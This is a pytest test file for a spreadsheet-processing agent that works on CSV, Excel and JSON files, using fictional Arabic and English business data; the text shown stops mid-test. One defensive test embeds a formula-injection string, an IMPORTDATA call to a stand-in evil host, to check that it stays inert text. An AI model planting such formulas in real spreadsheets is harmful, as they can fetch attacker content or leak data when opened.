"""The Spreadsheets agent (2.0.0, with JSON), its program started and spoken to in the standard's messages.

The fixtures are fictional: Sidra Office Supplies' customer lists from the accounting export and the sales sheet, and
the files a Gulf office actually sends — Arabic headers, a decimal comma, Arabic-Indic digits, CSVs saved by Windows
Excel as cp1256 or UTF-16, a title above the header, a merged region label, formulas.
"""

import codecs
import csv
import io
import json
import re
import time
import zipfile
from datetime import date
from pathlib import Path

import pytest
import yaml
from openpyxl import Workbook, load_workbook

from standard.http import FILE_MOST
from tests.harness import ROOT, Chat, Records, probe, run


CUSTOMERS_CSV = """Customer ID,Name,Email,Phone,Country
00017,Harbourline Consulting,dana@harbourline.example,+971 50 123 4567,UAE
00018,Cedar Office,buy@cedaroffice.example,,uae
00019,Pier 9 Studio,hello@pier9.example,050-987-6543,UAE
00017,Harbourline Consulting,DANA@harbourline.example,+971501234567,UAE
00020,Northlight Seating,quotes@northlight-seating.example,+971 4 555 0100,U.A.E.
"""

#: A branch report as Excel saves it in the Gulf: titles above the header, semicolons, a decimal comma.
BRANCH_SALES = ("تقرير مبيعات الفروع\r\nتاريخ التقرير: 2026-10-01\r\n\r\n"
                "الفرع;الشهر;المبيعات;عدد الطلبات\r\n"
                "دبي;2026-07;12.450,50;31\r\nأبوظبي;2026-07;9.870,00;24\r\n"
                "دبي;2026-08;13.120,25;33\r\nأبوظبي;2026-08;10.040,00;26\r\n"
                "الشارقة;2026-08;3.980,50;11\r\n")


def sales_xlsx(cached: bool = False) -> bytes:
    wb = Workbook()
    ws = wb.active
    ws.title = "Sales"
    ws.append(["Account", "Company", "Contact Email", "Mobile", "Last Order", "Orders", "Value"])
    ws.append(["00017", "Harbourline Consulting", "dana@harbourline.example", "0501234567",
               date(2026, 8, 30), 3, 4120.5])
    ws.append(["00019", "Pier 9 Studio", "hello@pier9.example", "0509876543", date(2026, 7, 12), 1, 860])
    ws.append(["00021", "Marina Dental", "office@marinadental.example", "0501112222", date(2026, 9, 1), 2, 1299.99])
    ws.append(["00020", "Northlight Seating", "sales@northlight-seating.example", "045550100",
               date(2026, 6, 2), 5, 9800])
    ws.append([None, "Total", None, None, None, "=SUM(F2:F5)", "=SUM(G2:G5)"])
    buffer = io.BytesIO()
    wb.save(buffer)
    raw = buffer.getvalue()
    return with_cached(raw, {"SUM(F2:F5)": "11", "SUM(G2:G5)": "16080.49"}) if cached else raw


def with_cached(raw: bytes, values: dict) -> bytes:
    """The file as a spreadsheet program saves it: each formula with the value it last computed."""
    out = io.BytesIO()
    with zipfile.ZipFile(io.BytesIO(raw)) as source, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as target:
        for item in source.infolist():
            data = source.read(item.filename)
            if item.filename.startswith("xl/worksheets/"):
                text = data.decode("utf-8")
                for formula, value in values.items():
                    text = re.sub(rf"(<f>{re.escape(formula)}</f>)(<v\s*/>|<v></v>)?", rf"\g<1><v>{value}</v>", text)
                data = text.encode("utf-8")
            target.writestr(item, data)
    return out.getvalue()


def make():
    provider = Records()
    return Chat(provider), provider


def invoke(agents, ex, name, inputs, chat_level=1):
    return run(ex.invoke(agents["sheets"], name, inputs, chat_level=chat_level))


def upload(ex, filename, raw) -> str:
    """A file the person attaches to the chat: its ref, which a call names."""
    if isinstance(raw, (dict, list)):
        raw = json.dumps(raw, ensure_ascii=False).encode("utf-8")
    return ex.file(filename, raw if isinstance(raw, bytes) else raw.encode("utf-8"))


def workbook(ex, result):
    return load_workbook(io.BytesIO(ex.files[result["file_ref"]]["content"]))


def produced_text(ex, result) -> bytes:
    return ex.files[result["file_ref"]]["content"]


def job(provider, result):
    record = provider.data["job"][result["job_ref"]]
    return {**record["keys"], **record["values"]}


class TestThePackage:
    def test_the_worker_verifies_every_declared_function(self, agents):
        assert probe(agents["sheets"]) == []

    def test_the_manifest_is_a_merged_major_version_with_honest_levels(self):
        manifest = yaml.safe_load((ROOT / "sheets" / "manifest.yaml").read_text(encoding="utf-8"))
        assert manifest["agent"]["version"] == "2.0.0"
        assert len(manifest["agent"]["instructions"]) <= 4000 and len(manifest["agent"]["examples"]) <= 6
        levels = {f["id"]: f["level"] for f in manifest["functions"]}
        assert len(levels) <= 100
        # A file produced with a record of the job is level 1; reads are 0; nothing here is wider.
        assert {k for k, v in levels.items() if v == 0} == {"read_inspect", "read_rows", "json_inspect", "json_select",
                                                            "json_compare"}
        assert set(levels.values()) == {0, 1}
        for function in manifest["functions"]:
            writes = any(c.startswith("record.create") for c in function.get("calls") or [])
            assert function["level"] == (1 if writes else 0), function["id"]
        job = next(r for r in manifest["resources"]["data"] if r["id"] == "job")
        assert {f["name"]: f["storage"] for f in job["fields"]}["summary"] == "values"
        assert not (ROOT / "json_data").exists()


class TestAskingForColumnsByName:
    def test_columns_asked_for_in_another_case_still_carry_their_values(self, agents):
        ex, _ = make()
        ref = upload(ex, "customers.csv", CUSTOMERS_CSV)
        result, status = invoke(agents, ex, "read_rows", {"file_ref": ref, "columns": ["CUSTOMER ID", " name "]})
        assert status == "success", result
        assert result["columns"] == ["Customer ID", "Name"] and result["total_rows"] == 5
        assert result["rows"][0] == {"Customer ID": "00017", "Name": "Harbourline Consulting"}

    def test_a_column_that_is_not_there_is_refused(self, agents):
        ex, _ = make()
        ref = upload(ex, "customers.csv", CUSTOMERS_CSV)
        result, status = invoke(agents, ex, "read_rows", {"file_ref": ref, "columns": ["Assignee"]})
        assert status == "error" and "Assignee" in result["error"]

    def test_an_empty_page_says_the_sheet_is_not_empty(self, agents):
        ex, _ = make()
        ref = upload(ex, "customers.csv", CUSTOMERS_CSV)
        result, status = invoke(agents, ex, "read_rows", {"file_ref": ref, "from_row": 99})
        assert status == "success" and result["rows"] == [] and "has 5" in result["note"]


class TestReading:
    def test_inspect_sees_types_zeros_blanks_and_formulas(self, agents):
        ex, _ = make()
        ref = upload(ex, "sales.xlsx", sales_xlsx())
        result, status = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        assert status == "success", result
        assert result["kind"] == "xlsx"
        assert result["sheets"] == [{"name": "Sales", "rows": 5, "header_row": 1, "merged_ranges": 0}]
        by_name = {c["name"]: c for c in result["columns"]}
        assert by_name["Account"]["leading_zeros"] is True and by_name["Account"]["type"] == "text"
        assert by_name["Last Order"]["type"] == "date"
        assert by_name["Value"]["type"] == "number" and by_name["Value"]["formulas"] == 1

    def test_rows_keep_identifiers_dates_and_formulas(self, agents):
        ex, _ = make()
        ref = upload(ex, "sales.xlsx", sales_xlsx())
        result, status = invoke(agents, ex, "read_rows", {
            "file_ref": ref, "max_rows": 2, "columns": ["Account", "Last Order", "Value"]})
        assert status == "success", result
        assert result["rows"][0] == {"Account": "00017", "Last Order": "2026-08-30", "Value": "4120.5"}
        assert result["truncated"] is True and result["next_row"] == 3 and result["first_sheet_row"] == 2
        rest, _ = invoke(agents, ex, "read_rows", {"file_ref": ref, "from_row": 5, "formulas": True,
                                                   "columns": ["Company", "Value"]})
        assert rest["rows"] == [{"Company": "Total", "Value": "=SUM(G2:G5)"}]

    def test_the_header_is_found_under_arabic_titles(self, agents):
        ex, _ = make()
        ref = upload(ex, "فروع.csv", ("﻿" + BRANCH_SALES).encode("utf-8"))
        result, status = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        assert status == "success", result
        assert result["sheets"][0]["header_row"] == 4 and result["sheets"][0]["rows"] == 5
        assert result["delimiter"] == ";" and result["encoding"] == "utf-8-sig"
        assert [c["name"] for c in result["columns"]] == ["الفرع", "الشهر", "المبيعات", "عدد الطلبات"]
        assert {c["name"]: c.get("decimal") for c in result["columns"]}["المبيعات"] == ","
        assert any("row 4" in note for note in result["notes"])
        rows, _ = invoke(agents, ex, "read_rows", {"file_ref": ref, "max_rows": 1})
        assert rows["rows"] == [{"الفرع": "دبي", "الشهر": "2026-07", "المبيعات": "12.450,50", "عدد الطلبات": "31"}]
        assert rows["first_sheet_row"] == 5

    def test_a_header_row_can_be_named(self, agents):
        ex, _ = make()
        ref = upload(ex, "report.csv", "Quarterly report,\nRegion,Total\nNorth,10\nSouth,20\n")
        result, status = invoke(agents, ex, "read_rows", {"file_ref": ref, "header_row": 2})
        assert status == "success", result
        assert result["columns"] == ["Region", "Total"] and len(result["rows"]) == 2
        result, status = invoke(agents, ex, "read_rows", {"file_ref": ref, "header_row": 40})
        assert status == "error" and "no row 40" in result["error"]

    def test_merged_cells_carry_their_value_over_the_range(self, agents):
        wb = Workbook()
        ws = wb.active
        ws.append(["المنطقة", "الفرع", "المبيعات"])
        ws.append(["الشمالية", "رأس الخيمة", 100])
        ws.append([None, "أم القيوين", 50])
        ws.append([None, "الفجيرة", 70])
        ws.append(["الوسطى", "دبي", 400])
        ws.merge_cells("A2:A4")
        buffer = io.BytesIO()
        wb.save(buffer)
        ex, _ = make()
        ref = upload(ex, "regions.xlsx", buffer.getvalue())
        inspected, _ = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        assert inspected["sheets"][0]["merged_ranges"] == 1
        result, status = invoke(agents, ex, "calc_aggregate", {
            "file_ref": ref, "group_by": ["المنطقة"], "measures": [{"column": "المبيعات", "op": "sum"}]})
        assert status == "success", result
        assert result["groups"] == [{"المنطقة": "الشمالية", "sum(المبيعات)": "220"},
                                    {"المنطقة": "الوسطى", "sum(المبيعات)": "400"}]

    @pytest.mark.parametrize("encoding,expected", [("cp1256", "cp1256"), ("utf-16", "utf-16"),
                                                   ("utf-8-sig", "utf-8-sig"), ("utf-8", "utf-8")])
    def test_arabic_csvs_are_read_in_whatever_windows_saved_them(self, agents, encoding, expected):
        text = "الاسم\tالمدينة\tالمبلغ\r\nأحمد علي\tدبي\t12,50\r\nفاطمة حسن\tالشارقة\t7,25\r\n"
        ex, _ = make()
        ref = upload(ex, "عملاء.csv", text.encode(encoding))
        result, status = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        assert status == "success", result
        assert result["encoding"] == expected and result["delimiter"] == "\t"
        assert [c["name"] for c in result["columns"]] == ["الاسم", "المدينة", "المبلغ"]
        rows, _ = invoke(agents, ex, "read_rows", {"file_ref": ref})
        assert rows["rows"][1] == {"الاسم": "فاطمة حسن", "المدينة": "الشارقة", "المبلغ": "7,25"}
        total, _ = invoke(agents, ex, "calc_aggregate", {"file_ref": ref,
                                                         "measures": [{"column": "المبلغ", "op": "sum"}]})
        assert total["groups"] == [{"sum(المبلغ)": "19.75"}]

    def test_a_western_windows_csv_stays_western(self, agents):
        ex, _ = make()
        ref = upload(ex, "suppliers.csv", "Name,City\nCafé Müller,Zürich\nCrème Co,Genève\n".encode("cp1252"))
        result, _ = invoke(agents, ex, "read_rows", {"file_ref": ref})
        assert result["rows"][0] == {"Name": "Café Müller", "City": "Zürich"}

    def test_a_sheet_past_the_row_limit_is_refused_with_its_count_never_cut(self, agents):
        lines = ["id,amount"] + [f"{n},1" for n in range(100_005)]
        ex, _ = make()
        ref = upload(ex, "big.csv", "\n".join(lines))
        result, status = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        assert status == "error" and result["kind"] == "too_large"
        assert "100,005 rows" in result["error"] and "100,000" in result["error"]

    def test_a_file_past_a_chat_files_size_is_refused_before_reading(self, agents):
        ex, _ = make()
        ref = upload(ex, "huge.csv", b"a,b\n" + b"1,2\n" * (FILE_MOST // 4 + 10))
        result, status = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        assert status == "error" and result["kind"] == "too_large" and "MB" in result["error"]

    def test_text_that_starts_with_an_equals_sign_is_not_a_formula(self, agents):
        wb = Workbook()
        ws = wb.active
        ws.append(["Note", "Amount"])
        ws.cell(row=2, column=1, value='=IMPORTDATA("https://evil.example/x")').data_type = "s"
        ws.cell(row=2, column=2, value=5)
        buffer = io.BytesIO()
        wb.save(buffer)
        ex, _ = make()
        ref = upload(ex, "notes.xlsx", buffer.getvalue())
        inspected, _ = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        assert {c["name"]: c["formulas"] for c in inspected["columns"]}["Note"] == 0
        result, _ = invoke(agents, ex, "clean_dedupe", {"file_ref": ref, "key_columns": ["Note"], "filename": "n"})
        cell = workbook(ex, result)["Clean"]["A2"]
        assert cell.value.startswith("=IMPORTDATA") and cell.data_type == "s"


class TestNumbersAsTheColumnWritesThem:
    def test_a_decimal_comma_is_read_as_one_never_times_a_hundred(self, agents):
        ex, _ = make()
        ref = upload(ex, "مصاريف.csv", "البند;المبلغ\nقهوة;12,50\nفندق;1.234,56\nتاكسي;38\n")
        result, status = invoke(agents, ex, "calc_aggregate", {
            "file_ref": ref, "measures": [{"column": "المبلغ", "op": "sum"}, {"column": "المبلغ", "op": "max"}]})
        assert status == "success", result
        assert result["groups"] == [{"sum(المبلغ)": "1285.06", "max(المبلغ)": "1234.56"}]
        assert result["decimal_marks"] == {"المبلغ": ","}

    def test_arabic_indic_digits_and_the_arabic_decimal_mark_are_numbers(self, agents):
        ex, _ = make()
        ref = upload(ex, "a.csv", "البند,المبلغ\nأ,٣٤٥٫٥٠\nب,١٬٢٠٠٫٢٥\n")
        result, _ = invoke(agents, ex, "calc_aggregate", {"file_ref": ref,
                                                          "measures": [{"column": "المبلغ", "op": "sum"}]})
        assert result["groups"] == [{"sum(المبلغ)": "1545.75"}]

    def test_an_ambiguous_column_is_refused_until_the_person_names_the_mark(self, agents):
        ex, _ = make()
        ref = upload(ex, "amounts.csv", "item;amount\nA;1,250\nB;2,500\nC;980\n")
        inspected, _ = invoke(agents, ex, "read_inspect", {"file_ref": ref})
        column = {c["name"]: c for c in inspected["columns"]}["amount"]
        assert column["decimal"] == "ambiguous" and "1,250" in column["ambiguous_examples"]
        result, status = invoke(agents, ex, "calc_aggregate", {"file_ref": ref,
                                                               "measures": [{"column": "amount", "op": "sum"}]})
        assert status == "error" and "doesn't say its decimal mark" in result["error"] and "1,250" in result["error"]
        point, _ = invoke(agents, ex, "calc_aggregate", {"file_ref": ref, "decimal": ".",
                                                         "measures": [{"column": "amount", "op": "sum"}]})
        comma, _ = invoke(agents, ex, "calc_aggregate", {"file_ref": ref, "decimal": ",",
                                                         "measures": [{"column": "amount", "op": "sum"}]})
        assert point["groups"] == [{"sum(amount)": "4730"}]
        assert comma["groups"] == [{"sum(amount)": "983.750"}]

    def test_a_column_of_two_currencies_is_never_added_up(self, agents):
        ex, _ = make()
        ref = upload(ex, "mixed.csv", "item,amount\nA,AED 100.00\nB,USD 40.00\n")
        result, status = invoke(agents, ex, "calc_aggregate", {"file_ref": ref,
                                                               "measures": [{"column": "amount", "op": "sum"}]})
        assert status == "error" and "2 currencies" in result["error"]

    def test_prices_as_numbers_keeps_identifiers_and_lists_what_it_left(self, agents):
        ex, provider = make()
        ref = upload(ex, "prices.csv", "الرمز;الهاتف;السعر\n00412;+971501234567;1.250,00 د.إ\n"
                                       "00413;+971509999999;12,5\n00414;;غير متوفر\n")
        result, status = invoke(agents, ex, "clean_convert", {
            "file_ref": ref, "columns": ["الرمز", "الهاتف", "السعر"], "filename": "أسعار"})
        assert status == "success", result
        assert result["filename"] == "أسعار.xlsx"
        assert result["converted"] == 2 and result["not_converted"] == 6
        assert result["decimal_marks"]["السعر"] == ","
        why = {(c["column"], c["value"]): c["why"] for c in result["not_converted_cells"]}
        assert "identifier" in why[("الرمز", "00412")] and "identifier" in why[("الهاتف", "+971501234567")]
        sheet = workbook(ex, result)["Converted"]
        assert sheet["C2"].value == 1250 and sheet["C3"].value == 12.5 and sheet["C4"].value == "غير متوفر"
        assert sheet["A2"].value == "00412" and sheet.sheet_view.rightToLeft is True
        assert job(provider, result)["kind"] == "convert"


class TestChecking:
    def test_quality_finds_duplicates_gaps_and_variants(self, agents):
        ex, provider = make()
        ref = upload(ex, "customers.csv", CUSTOMERS_CSV)
        result, status = invoke(agents, ex, "check_quality", {
            "file_ref": ref, "key_columns": ["Customer ID"],
            "required_columns": ["Phone", "Email"], "categorical_columns": ["Country"]})
        assert status == "success", result
        assert result["duplicate_groups"] == [{"key": "00017", "rows": [2, 5]}]
        assert result["missing"] == [{"column": "Phone", "rows": [3], "count": 1}]
        assert result["inconsistent"] == [{"column": "Country", "variants": ["UAE", "uae"]}]
        phones, _ = invoke(agents, ex, "check_quality", {"file_ref": ref, "key_columns": ["Phone"]})
        assert phones["duplicate_groups"] == [{"key": "971501234567", "rows": [2, 5]}]
        assert phones["blank_keys"] == 1                       # a blank phone is no duplicate of anything
        assert job(provider, phones)["kind"] == "quality"


class TestCleaning:
    def test_dedupe_keeps_the_first_and_logs_the_rest(self, agents):
        ex, _ = make()
        ref = upload(ex, "customers.csv", CUSTOMERS_CSV)
        result, status = invoke(agents, ex, "clean_dedupe", {
            "file_ref": ref, "key_columns": ["Customer ID", "Name"], "filename": "customers-clean"})
        assert status == "success", result
        assert result["kept"] == 4 and result["removed"] == 1 and result["removed_rows"] == [5]
        wb = workbook(ex, result)
        assert wb.sheetnames == ["Clean", "Removed", "Change Log"]
        assert [r[0] for r in list(wb["Clean"].iter_rows(values_only=True))[1:]] == ["00017", "00018", "00019",
                                                                                     "00020"]
        log = list(wb["Change Log"].iter_rows(values_only=True))
        assert log[1][1] == "rules" and log[2] == (5, "removed",
                                                   "duplicate of row 2 on Customer ID, Name: 00017 | "
                                                   "harbourline consulting")
        assert ex.files[ref]["content"] == CUSTOMERS_CSV.encode()

    def test_rows_with_a_blank_key_are_kept_and_never_duplicates(self, agents):
        ex, _ = make()
        ref = upload(ex, "c.csv", "الاسم,البريد\nأحمد,\nسارة,\nأحمد,a@x.example\nأحمد,A@x.example\n")
        result, _ = invoke(agents, ex, "clean_dedupe", {"file_ref": ref, "key_columns": ["البريد"],
                                                        "filename": "c"})
        assert result["kept"] == 3 and result["removed"] == 1 and result["blank_keys"] == 2

    def test_formulas_move_as_the_values_the_file_computed_never_as_broken_text(self, agents):
        ex, _ = make()
        ref = upload(ex, "sales.xlsx", sales_xlsx(cached=True))
        result, status = invoke(agents, ex, "clean_dedupe", {
            "file_ref": ref, "key_columns": ["Account"], "filename": "sales-clean"})
        assert status == "success", result
        assert result["formulas_as_values"] == 2
        sheet = workbook(ex, result)["Clean"]
        rows = list(sheet.iter_rows(values_only=True))
        assert rows[1][0] == "00017" and str(rows[1][4]).startswith("2026-08-30")
        total = sheet.cell(row=6, column=7)
        assert total.value == 16080.49 and total.data_type == "n"
        assert "=SUM(G2:G5)" in total.comment.text and "Sales!G6" in total.comment.text
        log = list(workbook(ex, result)["Change Log"].iter_rows(values_only=True))
        assert any(r[1] == "formulas" and "2 formula cell(s)" in r[2] for r in log)

    def test_a_formula_never_computed_is_left_empty_and_said(self, agents):
        ex, _ = make()
        ref = upload(ex, "sales.xlsx", sales_xlsx())
        result, _ = invoke(agents, ex, "clean_dedupe", {"file_ref": ref, "key_columns": ["Account"],
                                                        "filename": "s"})
        cell = workbook(ex, result)["Clean"].cell(row=6, column=7)
        assert cell.value is None and "no computed value" in cell.comment.text

    def test_producing_a_file_is_level_one(self, agents):
        ex, _ = make()
        ref = upload(ex, "customers.csv", CUSTOMERS_CSV)
        result, status = invoke(agents, ex, "clean_dedupe", {
            "file_ref": ref, "key_columns": ["Customer ID"], "filename": "x"}, chat_level=0)
        assert status == "error" and result.get("denied") is True
        _, status = invoke(agents, ex, "clean_dedupe", {
            "file_ref": ref, "key_columns": ["Customer ID"], "filename": "x"}, chat_level=1)
        assert status == "success"


class TestReconciling:
    def test_two_lists_match_by_rules_and_near_matches_stay_uncertain(self, agents):
        ex, provider = make()
        a = upload(ex, "customers.csv", CUSTOMERS_CSV)
        b = upload(ex, "sales.xlsx", sales_xlsx())
        result, status = invoke(agents, ex, "reconcile_match", {
            "file_ref_a": a, "file_ref_b": b, "filename": "reconciled",
            "keys": [{"a": "Customer ID", "b": "Account", "normalize": "trim"},
                     {"a": "Email", "b": "Contact Email", "normalize": "lowercase"}],
            "compare": [{"a": "Phone", "b": "Mobile"}]})
        assert status == "success", result
        assert result["matched"] == 2 and result["uncertain"] == 1
        assert result["uncertain_pairs"] == [{"row_a": 6, "row_b": 5, "agree": "Customer ID", "differ": "Email"}]
        assert result["only_in_a"] == 2 and result["only_in_b"] == 2 and result["differences"] == 2
        wb = workbook(ex, result)
        assert wb.sheetnames == ["Matched", "Only in A", "Only in B", "Uncertain", "Differences", "Change Log"]
        log = list(wb["Change Log"].iter_rows(values_only=True))
        assert any(r[1] == "uncertain" and "not merged" in r[2] for r in log)
        assert job(provider, result)["summary"].startswith("2 matched, 2 only in A, 2 only in B, 1 uncertain")
        assert "summary" not in provider.data["job"][result["job_ref"]]["keys"]

    def test_blank_keys_never_match_each_other(self, agents):
        ex, _ = make()
        a = upload(ex, "a.csv", "الاسم,البريد\nأحمد,\nسارة,sara@x.example\nعلي,\n")
        b = upload(ex, "b.csv", "الاسم,البريد\nمحمد,\nسارة,SARA@x.example\n")
        result, status = invoke(agents, ex, "reconcile_match", {
            "file_ref_a": a, "file_ref_b": b, "filename": "r", "keys": [{"a": "البريد", "b": "البريد"}]})
        assert status == "success", result
        assert result["matched"] == 1 and result["blank_keys_a"] == 2 and result["blank_keys_b"] == 1
        assert result["only_in_a"] == 2 and result["only_in_b"] == 1
        why = [r[-1] for r in list(workbook(ex, result)["Only in A"].iter_rows(values_only=True))[1:]]
        assert why == ["a key is blank; never matched"] * 2

    def test_a_blank_part_is_never_a_near_match_either(self, agents):
        ex, _ = make()
        a = upload(ex, "a.csv", "name,email\nAhmed,\n")
        b = upload(ex, "b.csv", "name,email\nAhmed,ahmed@x.example\n")
        result, _ = invoke(agents, ex, "reconcile_match", {
            "file_ref_a": a, "file_ref_b": b, "filename": "r",
            "keys": [{"a": "name", "b": "name"}, {"a": "email", "b": "email"}]})
        assert result["matched"] == 0 and result["uncertain"] == 0

    def test_large_lists_reconcile_in_near_linear_time(self, agents):
        rows = 30_000
        a = "sku,price\n" + "".join(f"SKU-{n:06d},{n % 97}.50\n" for n in range(rows))
        b = "sku,price\n" + "".join(f"SKU-{n:06d},{n % 97}.50\n" for n in range(rows - 1, -1, -1))
        ex, _ = make()
        started = time.monotonic()
        result, status = invoke(agents, ex, "reconcile_match", {
            "file_ref_a": upload(ex, "a.csv", a), "file_ref_b": upload(ex, "b.csv", b), "filename": "r",
            "keys": [{"a": "sku", "b": "sku"}], "compare": [{"a": "price", "b": "price"}]})
        assert status == "success", result
        assert result["matched"] == rows and result["differences"] == 0
        assert time.monotonic() - started < 60

    def test_an_unknown_key_column_is_named(self, agents):
        ex, _ = make()
        a = upload(ex, "customers.csv", CUSTOMERS_CSV)
        result, status = invoke(agents, ex, "reconcile_match", {
            "file_ref_a": a, "file_ref_b": a, "filename": "x", "keys": [{"a": "Customer ID", "b": "Nope"}]})
        assert status == "error" and "No column 'Nope'" in result["error"]


class TestCombining:
    MARINA = "Date,Merchant,Category,Amount\n2026-09-18,Careem,Transport,38.00\n2026-09-18,Al Seef House,Meals,184.50\n"
    DEIRA = ("Date,Merchant,Category,Amount\n2026-09-18,Creekside Suites,Hotel,\"1,240.00\"\n"
             "2026-09-18,Pier 9 Supply,Stationery,n/a\n")
    JLT = "Date,Merchant,Amount,Card\n2026-09-18,Northlight,75,00412\n"
    #: The Sharjah branch's Excel writes a decimal comma.
    SHARJAH = "التاريخ;التاجر;Amount\n2026-09-18;كرك;12,50\n2026-09-18;مطبعة;1.000,00\n"

    def combine(self, agents, files, **more):
        ex, _ = make()
        refs = [{"file_ref": upload(ex, name, raw), **extra} for name, raw, extra in files]
        result, status = invoke(agents, ex, "combine_files", {"files": refs, "filename": "branches", **more})
        return result, status, ex

    def test_several_files_become_one_workbook_with_a_summary(self, agents):
        result, status, ex = self.combine(agents, [
            ("marina.csv", self.MARINA, {"sheet_name": "Marina"}), ("deira.csv", self.DEIRA, {}),
            ("jlt.csv", self.JLT, {"sheet_name": "JLT"})], total_column="Amount")
        assert status == "success", result
        assert result["combined"] == 3 and result["rows"] == 5
        assert result["sheets"] == ["Summary", "All", "Marina", "deira", "JLT", "Change Log"]
        assert result["grand_total"] == "1537.50"
        by_source = {f["source"]: f for f in result["files"]}
        assert by_source["Marina"]["total"] == "222.50" and by_source["deira"]["not_a_number"] == 1
        assert by_source["JLT"]["problem"] == "missing column(s): Category; extra column(s): Card"
        everything = list(workbook(ex, result)["All"].iter_rows(values_only=True))
        assert everything[5] == ("JLT", "2026-09-18", "Northlight", None, 75, "00412")

    def test_each_file_is_read_with_its_own_decimal_mark(self, agents):
        result, status, ex = self.combine(agents, [("marina.csv", self.MARINA, {}),
                                                   ("الشارقة.csv", self.SHARJAH, {})], total_column="Amount")
        assert status == "success", result
        assert {f["source"]: f["total"] for f in result["files"]} == {"marina": "222.50", "الشارقة": "1012.50"}
        assert result["grand_total"] == "1235.00"

    def test_a_file_that_cannot_be_read_is_left_out_and_said(self, agents):
        result, status, _ = self.combine(agents, [("marina.csv", self.MARINA, {}), ("empty.csv", "", {}),
                                                  ("deira.csv", self.DEIRA, {})])
        assert status == "success", result
        assert result["combined"] == 2 and result["left_out"] == 1 and "grand_total" not in result


class TestCalculating:
    def test_aggregate_is_decimal_and_skips_what_is_not_a_number(self, agents):
        ex, _ = make()
        ref = upload(ex, "sales.xlsx", sales_xlsx())
        result, status = invoke(agents, ex, "calc_aggregate", {
            "file_ref": ref, "measures": [{"column": "Value", "op": "sum"}, {"column": "Orders", "op": "sum"},
                                          {"column": "Company", "op": "count"}]})
        assert status == "success", result
        assert result["groups"] == [{"sum(Value)": "16080.49", "sum(Orders)": "11", "count(Company)": 5}]
        assert result["skipped_cells"] == 2 and result["rows_read"] == 5

    def test_groups_are_bounded_and_refused_past_the_bound(self, agents):
        ex, _ = make()
        ref = upload(ex, "many.csv", "id,amount\n" + "".join(f"{n},1\n" for n in range(1, 700)))
        result, status = invoke(agents, ex, "calc_aggregate", {"file_ref": ref, "group_by": ["id"],
                                                               "measures": [{"column": "amount", "op": "sum"}]})
        assert status == "error" and "more than 500 groups" in result["error"]

    def test_a_pivot_of_arabic_branch_sales_is_summed_in_code(self, agents):
        ex, provider = make()
        ref = upload(ex, "فروع.csv", BRANCH_SALES)
        result, status = invoke(agents, ex, "calc_pivot", {
            "file_ref": ref, "rows": ["الفرع"], "across": "الشهر", "values": "المبيعات", "filename": "محوري"})
        assert status == "success", result
        assert result["columns"] == ["الفرع", "2026-07", "2026-08", "Total"]
        by_branch = {row[0]: row[1:] for row in result["rows"]}
        assert by_branch["دبي"] == ["12450.50", "13120.25", "25570.75"]
        assert by_branch["الشارقة"] == ["", "3980.50", "3980.50"]
        assert result["totals"] == ["Total", "22320.50", "27140.75", "49461.25"]
        assert result["grand_total"] == "49461.25"
        sheet = workbook(ex, result)["Pivot"]
        assert sheet.sheet_view.rightToLeft is True and sheet["D3"].value == 3980.5
        assert job(provider, result)["kind"] == "pivot"


class TestArranging:
    def test_rows_are_filtered_and_sorted_into_a_csv_excel_reads_as_arabic(self, agents):
        ex, _ = make()
        ref = upload(ex, "فروع.csv", BRANCH_SALES)
        result, status = invoke(agents, ex, "arrange_rows", {
            "file_ref": ref, "filters": [{"column": "المبيعات", "op": "gt", "value": "10000"}],
            "sort": [{"column": "المبيعات", "descending": True}], "columns": ["الفرع", "المبيعات"],
            "format": "csv", "delimiter": "semicolon", "filename": "كبرى"})
        assert status == "success", result
        assert result["rows"] == 3 and result["rows_read"] == 5 and result["filename"] == "كبرى.csv"
        raw = produced_text(ex, result)
        assert raw.startswith(codecs.BOM_UTF8)
        lines = raw.decode("utf-8-sig").splitlines()
        assert lines == ["الفرع;المبيعات", "دبي;13.120,25", "دبي;12.450,50", "أبوظبي;10.040,00"]

    def test_dates_compare_as_dates_and_blanks_sort_last(self, agents):
        ex, _ = make()
        ref = upload(ex, "sales.xlsx", sales_xlsx())
        result, status = invoke(agents, ex, "arrange_rows", {
            "file_ref": ref, "filters": [{"column": "Last Order", "op": "gte", "value": "2026-07-12"}],
            "sort": [{"column": "Last Order"}], "filename": "recent"})
        assert status == "success", result
        rows = list(workbook(ex, result)["Rows"].iter_rows(values_only=True))
        assert [r[0] for r in rows[1:]] == ["00019", "00017", "00021"]


ORDERS = {
    "exported": "2026-10-14",
    "orders": [
        {"id": "A-1001", "customer": {"name": "مؤسسة الميناء", "city": "مسقط", "email": "buy@harbour.example"},
         "total": 3700.0, "paid": True, "tags": ["repeat", "priority"], "lines": [{"sku": "ARIA-1", "qty": 20}]},
        {"id": "A-1002", "customer": {"name": "Cedar Office", "email": "not-an-email"},
         "total": 1720.5, "paid": 1, "placed": "2026-13-45", "lines": [{"sku": "ARIA-1", "qty": 10}]},
        {"id": "A-1003", "customer": {"name": "Northlight", "city": "صلالة"}, "paid": False, "lines": []},
    ],
}

ORDER_SCHEMA = {
    "type": "object",
    "required": ["id", "total"],
    "properties": {
        "id": {"type": "string"},
        "total": {"type": "number", "minimum": 0},
        "placed": {"type": "string", "format": "date"},
        "customer": {"type": "object", "properties": {"email": {"type": "string", "format": "email"}}},
    },
}


@pytest.fixture
def orders(agents):
    ex, provider = make()
    return ex, provider, upload(ex, "orders.json", ORDERS)


class TestJson:
    def test_the_key_map_says_which_records_lack_a_field(self, agents):
        ex, _ = make()
        ref = upload(ex, "orders.json", ORDERS["orders"])
        info, status = invoke(agents, ex, "json_inspect", {"file_ref": ref})
        assert status == "success", info
        assert info["kind"] == "json" and info["valid"] is True and info["records"] == 3
        keys = {row["path"]: row for row in info["keys"]}
        assert keys["total"]["present"] == 2 and keys["customer.city"]["present"] == 2
        assert keys["paid"]["types"] == ["boolean", "number"]
        assert keys["customer.name"]["example"] == "مؤسسة الميناء"

    def test_a_bad_json_lines_line_is_named_by_its_number(self, agents):
        ex, _ = make()
        ref = upload(ex, "events.jsonl", '{"id": 1, "الحالة": "تم"}\n{"id": 2}\n{"id": 3,\n{"id": 4}\n')
